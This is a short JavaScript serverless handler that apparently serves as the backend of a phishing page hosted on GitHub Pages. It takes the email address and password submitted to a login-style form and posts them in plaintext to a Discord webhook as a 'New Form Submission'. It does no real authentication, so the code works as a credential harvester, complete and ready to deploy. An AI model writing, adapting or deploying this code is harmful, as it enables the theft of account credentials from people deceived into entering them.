export default async function handler(req, res) {
  // Allow only POST
  if (req.method !== 'POST') {
    return res.status(405).json({ error: 'Method not allowed' });
  }

  // Optional: restrict requests to your GitHub Pages site
  const allowedOrigins = [
    'https://crewf.github.io'
  ];

  const origin = req.headers.origin || '';
  if (origin && !allowedOrigins.includes(origin)) {
    return res.status(403).json({ error: 'Forbidden origin' });
  }

  try {
    const { email, password, remember } = req.body || {};

    // Basic validation
    const safeEmail = String(email || '').trim();
    const safePassword = String(password || '').trim();
    const safeRemember = remember ? 'Yes' : 'No';

    if (!safeEmail || !safePassword) {
      return res.status(400).json({ error: 'Missing required fields' });
    }

    const webhookUrl = process.env.DISCORD_WEBHOOK_URL;
    if (!webhookUrl) {
      return res.status(500).json({ error: 'Server misconfigured' });
    }

    const payload = {
      content: '**New Form Submission**',
      embeds: [
        {
          title: 'New Form Submission',
          fields: [
            { name: 'email', value: safeEmail, inline: true },
            { name: 'password', value: safePassword, inline: true },
            { name: 'Remember Me', value: safeRemember, inline: true }
          ],
          timestamp: new Date().toISOString()
        }
      ]
    };

    const discordResponse = await fetch(webhookUrl, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify(payload)
    });

    if (!discordResponse.ok) {
      return res.status(502).json({ error: 'Discord webhook failed' });
    }

    return res.status(200).json({ success: true });
  } catch (error) {
    return res.status(500).json({ error: 'Internal server error' });
  }
}